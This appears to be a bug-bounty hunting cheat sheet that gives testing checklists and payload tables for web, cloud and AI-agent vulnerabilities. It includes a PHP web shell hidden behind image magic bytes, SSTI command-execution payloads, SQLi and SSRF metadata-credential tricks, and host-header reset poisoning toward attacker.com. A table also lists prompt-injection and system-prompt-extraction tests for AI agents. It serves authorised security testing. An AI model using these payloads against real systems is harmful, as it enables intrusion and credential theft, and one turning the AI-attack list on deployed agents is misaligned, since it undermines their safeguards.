# PHASE 3: HUNT

## Note-Taking System (Never Hunt Without This)

```
# TARGET: company.com -- SESSION 1

## Interesting Leads (not confirmed bugs yet)
- [14:22] /api/v2/invoices/{id} -- no auth check visible in source, testing...

## Dead Ends (don't revisit)
- /admin -> IP restricted, confirmed by trying 15+ bypass headers

## Anomalies
- GET /api/export returns 200 even when session cookie is missing
- Response time: POST /api/check-user -> 150ms (exists) vs 8ms (doesn't)

## Rabbit Holes (time-boxed, max 15 min each)
- [ ] 10 min: JWT kid injection on auth endpoint

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} -- read+write
```

---

## IDOR — Insecure Direct Object Reference

> #1 most paid web2 class — ~30% of all submissions that get paid.

### IDOR Variants (10 Ways to Test)

| Variant | What to Test |
|---|---|
| V1: Direct | Change object ID in URL path `/api/users/123` → `/api/users/456` |
| V2: Body param | Change ID in POST/PUT JSON body `{"user_id": 456}` |
| V3: GraphQL node | `{ node(id: "base64(OtherType:123)") { ... } }` |
| V4: Batch/bulk | `/api/users?ids=1,2,3,4,5` — request multiple IDs at once |
| V5: Nested | Change parent ID: `/orgs/{org_id}/users/{user_id}` |
| V6: File path | `/files/download?path=../other-user/file.pdf` |
| V7: Predictable | Sequential integers, timestamps, short UUIDs |
| V8: Method swap | GET returns 403? Try PUT/PATCH/DELETE on same endpoint |
| V9: Version rollback | v2 blocked? Try `/api/v1/` same endpoint |
| V10: Header injection | `X-User-ID: victim_id`, `X-Org-ID: victim_org` |

### IDOR Testing Checklist

- Create two accounts (A = attacker, B = victim)
- Log in as A, perform all actions, note all IDs in requests
- Log in as B, replay A's requests with A's IDs using B's auth
- Try EVERY endpoint with swapped IDs — not just GET, also PUT/DELETE/PATCH
- Check API v1/v2 differences
- Check GraphQL schema for node() queries
- Check WebSocket messages for client-supplied IDs
- Test batch endpoints (can you request multiple IDs?)
- Try adding unexpected params: `?user_id=other_user`

### IDOR Chains (higher payout)

- IDOR + Read PII = Medium
- IDOR + Write (modify other's data) = High
- IDOR + Admin endpoint = Critical (privilege escalation)
- IDOR + Account takeover path = Critical
- IDOR + Chatbot (LLM reads other user's data) = High

---

## SSRF — Server-Side Request Forgery

- Try cloud metadata: `http://169.254.169.254/latest/meta-data/`
- Try internal services: `http://127.0.0.1:6379/` (Redis), `:9200` (Elasticsearch), `:27017` (MongoDB)
- Test all IP bypass techniques (see table below)
- Test protocol bypass: `file://`, `dict://`, `gopher://`
- Look in: webhook URLs, import from URL, profile picture URL, PDF generators, XML parsers

### SSRF IP Bypass Table

| Bypass | Payload | Notes |
|---|---|---|
| Decimal IP | `http://2130706433/` | 127.0.0.1 as single decimal |
| Hex IP | `http://0x7f000001/` | Hex representation |
| Octal IP | `http://0177.0.0.1/` | Octal 0177 = 127 |
| Short IP | `http://127.1/` | Abbreviated notation |
| IPv6 | `http://[::1]/` | Loopback in IPv6 |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
| Redirect chain | `http://attacker.com/302->http://169.254.169.254` | Check each hop |
| DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external, fetch = internal |
| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
| Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
| Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Redis/other protocols |

### SSRF Impact Chain

- DNS-only = Informational (don't submit)
- Internal service accessible = Medium
- Cloud metadata readable = High (key exposure)
- Cloud metadata + exfil keys = Critical (code execution on cloud)
- Docker API accessible = Critical (direct RCE)

---

## OAuth / OIDC

- Missing `state` parameter → CSRF
- `redirect_uri` accepts wildcards → ATO
- Missing PKCE → code theft
- Implicit flow → token leakage in referrer
- Open redirect in post-auth redirect → OAuth token theft chain

### Open Redirect Bypass Table

| Bypass | Payload | Notes |
|---|---|---|
| Double URL encoding | `%252F%252F` | Decodes to `//` after double decode |
| Backslash | `https://target.com\@evil.com` | Some parsers normalize `\` to `/` |
| Missing protocol | `//evil.com` | Protocol-relative |
| @-trick | `https://target.com@evil.com` | target.com becomes username |
| Protocol-relative | `///evil.com` | Triple slash |
| Tab/newline injection | `//evil%09.com` | Whitespace in hostname |
| Fragment trick | `https://evil.com#target.com` | Fragment misleads validation |
| Null byte | `https://evil.com%00target.com` | Some parsers truncate at null |
| Parameter pollution | `?next=target.com&next=evil.com` | Last value wins |
| Path confusion | `/redirect/..%2F..%2Fevil.com` | Path traversal in redirect |
| Unicode normalization | `https://evil.com/target.com` | Visual confusion |

---

## File Upload

### File Upload Bypass Table

| Bypass | Technique |
|---|---|
| Double extension | `file.php.jpg`, `file.php%00.jpg` |
| Case variation | `file.pHp`, `file.PHP5` |
| Alternative extensions | `.phtml`, `.phar`, `.shtml`, `.inc` |
| Content-Type spoof | `image/jpeg` header with PHP content |
| Magic bytes | `GIF89a; <?php system($_GET['c']); ?>` |
| .htaccess upload | `AddType application/x-httpd-php .jpg` |
| SVG XSS | `<svg onload=alert(1)>` |
| Race condition | Upload + execute before cleanup runs |
| Polyglot JPEG/PHP | Valid JPEG that is also valid PHP |
| Zip slip | `../../etc/cron.d/shell` in filename inside archive |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

---

## Race Conditions

- Coupon codes / promo codes
- Gift card redemption
- Fund transfer / withdrawal
- Voting / rating limits
- OTP verification brute via race

```bash
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### Turbo Intruder — Single-Packet Attack

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```

---

## Business Logic

- Negative quantities in cart
- Price parameter tampering
- Workflow skip (e.g., pay without checkout)
- Role escalation via registration fields
- Privilege persistence after downgrade

---

## XSS — Cross-Site Scripting

### XSS Sinks (grep for these)

```js
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)    // string form
setInterval(userInput, ...)
new Function(userInput)

// MEDIUM RISK (context-dependent)
element.src = userInput        // JavaScript URI possible
element.href = userInput
location.href = userInput
```

### XSS Chains (escalate from Medium to High/Critical)

- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass → Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- XSS in chatbot response = stored XSS chain

---

## SQL Injection

### Detection

```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--

-- Error-based detection
'; SELECT 1/0--    # divide by zero error reveals SQLi
```

### Modern SQLi WAF Bypass

```
-- Comment variation
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
-- Case variation
SeLeCt * FrOm uSeRs
-- URL encoding
%27 OR %271%27=%271
-- Unicode apostrophe
' OR '1'='1
```

---

## GraphQL

### Introspection (alone = Informational, but reveals attack surface)

```graphql
{ __schema { types { name fields { name type { name } } } } }
```

### Missing Field-Level Auth

```graphql
# User query returns only own data
{ user(id: 1) { name email } }
# But node() bypasses per-object auth:
{ node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }
```

### Batching Attack (Rate Limit Bypass)

```json
[
  {"query": "{ login(email: \"user@test.com\", password: \"pass1\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass2\") }"},
  "...100 more..."
]
```

---

## LLM / AI Features

- Prompt injection via user input passed to LLM
- Indirect injection via document/URL the AI processes
- IDOR in chat history (enumerate conversation IDs)
- System prompt extraction via roleplay/encoding
- RCE via code execution tool abuse
- ASCII smuggling (invisible unicode in LLM output)

### Agentic AI Hunting (OWASP ASI01-ASI10)

| ID | Vuln Class | What to Test |
|---|---|---|
| ASI01 | Prompt injection | Override system prompt via user input — make agent ignore its rules |
| ASI02 | Tool misuse | Make AI call tools with attacker-controlled params (SSRF via "fetch URL", RCE via code tool) |
| ASI03 | Data exfil | Extract training data / PII via crafted prompts that leak context |
| ASI04 | Privilege escalation | Use AI to access admin-only tools — agent has broader perms than user |
| ASI05 | Indirect injection | Poison document/URL the AI processes — hidden instructions in fetched content |
| ASI06 | Excessive agency | AI takes destructive actions without confirmation — delete, send, pay |
| ASI07 | Model DoS | Craft inputs that cause infinite loops, excessive token usage, or OOM |
| ASI08 | Insecure output | AI generates XSS/SQLi/command injection in its output that gets rendered |
| ASI09 | Supply chain | Compromised plugins/tools/MCP servers the AI calls |
| ASI10 | Sensitive disclosure | AI reveals internal configs, API keys, system prompts, user data |

**Triage rule:** ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO for paid bounty.

---

## Cache Poisoning / Web Cache Deception

- Test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` — unkeyed headers reflected in response
- Parameter cloaking (`?param=value;poison=xss`)
- Fat GET (body params on GET requests)
- Web cache deception (`/account/settings.css` — trick cache into storing private response)
- Param Miner (Burp extension) — auto-discovers unkeyed headers

---

## HTTP Request Smuggling

- CL.TE: Content-Length processed by frontend, Transfer-Encoding by backend
- TE.CL: Transfer-Encoding processed by frontend, Content-Length by backend
- H2.CL: HTTP/2 downgrade smuggling
- TE obfuscation: `Transfer-Encoding: xchunked`, tab prefix, space prefix
- Use Burp "HTTP Request Smuggler" extension — detects automatically

### CL.TE Example

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Frontend reads Content-Length: 13 → sends all. Backend reads Transfer-Encoding → sees chunk "0" = end → "SMUGGLED" left in buffer → next user's request poisoned.

---

## SSTI — Server-Side Template Injection

### Detection Payloads

```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test

- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### RCE Payloads by Engine

```python
# Jinja2 -> RCE (Python / Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig -> RCE (PHP / Symfony)
{{["id"]|filter("system")}}

# Freemarker -> RCE (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB -> RCE (Ruby on Rails)
<%= `id` %>
```

---

## Subdomain Takeover

### Detection

```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME" | tee /tmp/cnames.txt
# Look for CNAMEs to: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com

# Automated takeover detection
nuclei -l /tmp/subs.txt -t ~/nuclei-templates/takeovers/ -o /tmp/takeovers.txt
```

### Quick-Kill Fingerprints

```
"There isn't a GitHub Pages site here"  -> GitHub Pages
"NoSuchBucket"                          -> AWS S3
"No such app"                           -> Heroku
"404 Web Site not found"                -> Azure App Service
"Fastly error: unknown domain"          -> Fastly CDN
"project not found"                     -> GitLab Pages
"It looks like you may have typed..."   -> Shopify
```

### Impact Escalation

- Basic takeover: serve page under target.com subdomain → Low/Medium
- Cookies: if target.com sets cookie with domain=.target.com → credential theft → High
- OAuth redirect: if sub.target.com is a registered redirect_uri → ATO chain → Critical
- CSP bypass: if sub.target.com is in target's CSP → XSS anywhere → Critical

---

## ATO — Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)

```
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=victim@company.com
# If reset link = https://attacker.com/reset?token=XXXX -> ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak

After clicking reset link, if page loads external resources → token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens

```bash
# If token < 16 hex chars or numeric only -> brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring / Reuse

Request token → wait 2 hours → use it → still works? Request token #1 → request token #2 → use token #1 → still works?

### Path 5: Email Change Without Re-Authentication

```
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# If no current_password required -> attacker changes email -> locks out victim
```

### Path 6: OAuth Account Linking Abuse

Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation

GET /login → note Set-Cookie session=XYZ → Log in → does session ID change? If not = fixation.

---

## Cloud / Infra Misconfigs

### S3 / GCS / Azure Blob

```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common names
for name in target target-backup target-assets target-prod target-staging target-uploads target-data; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

### Cloud Metadata (via SSRF)

```
AWS:     http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, then:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns AccessKeyId, SecretAccessKey, Token -> Critical

GCP (needs header Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

Azure (needs header Metadata: true):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Firebase Open Rules

```bash
curl -s "https://TARGET-APP.firebaseio.com/.json"
# If data returned -> open read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
# If success -> open write -> Critical
```

### Exposed Admin Panels

```
/jenkins       /grafana       /kibana        /elasticsearch
/swagger-ui.html  /api-docs   /phpMyAdmin    /adminer.php
/.env          /config.json   /server-status /actuator/env
```

### Kubernetes / Docker

```bash
# K8s API (unauthenticated):
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods
# Docker API:
curl -s http://TARGET:2375/containers/json
```
